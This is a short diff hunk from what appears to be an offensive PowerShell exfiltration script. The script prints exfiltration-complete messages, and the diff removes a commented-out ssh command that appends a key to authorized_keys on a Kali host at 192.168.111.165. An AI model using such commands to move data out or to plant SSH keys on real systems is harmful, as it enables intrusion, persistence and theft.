@@ -253,7 +253,6 @@ Write-Host $errorOutput
 #--------------------------------------------------------------------------------------------------------
 
 #Automation to Register Private Key on Authorized Keys
-#type .\rsa_private.ppk | ssh kali@192.168.111.165 "mkdir -p ~/.ssh; chmod 700 ~/.ssh; touch ~/.ssh/authorized_keys; cat >> ~/.ssh/authorized_keys";
 
 Write-Host "`n[+] Exfiltration Using PSCP Completed: [Alternative]" -ForegroundColor Green;
 Write-Host "`n[+] Operation Complete" -ForegroundColor Green;
